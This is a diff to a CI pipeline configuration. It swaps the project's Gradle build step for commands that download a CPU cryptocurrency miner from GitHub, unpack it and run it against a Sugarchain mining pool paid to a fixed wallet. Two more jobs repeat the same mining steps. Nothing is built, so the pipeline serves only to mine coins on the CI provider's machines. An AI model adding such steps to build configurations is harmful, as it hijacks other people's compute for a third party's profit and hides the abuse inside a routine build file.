@@ -23,7 +23,19 @@ blocks:
       jobs:
         - name: Build Project
           commands:
-            - ./gradlew bundleDebug
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v2 -t0'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v21 -t0'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v23 p-t0'
       epilogue:
         on_pass:
           commands:
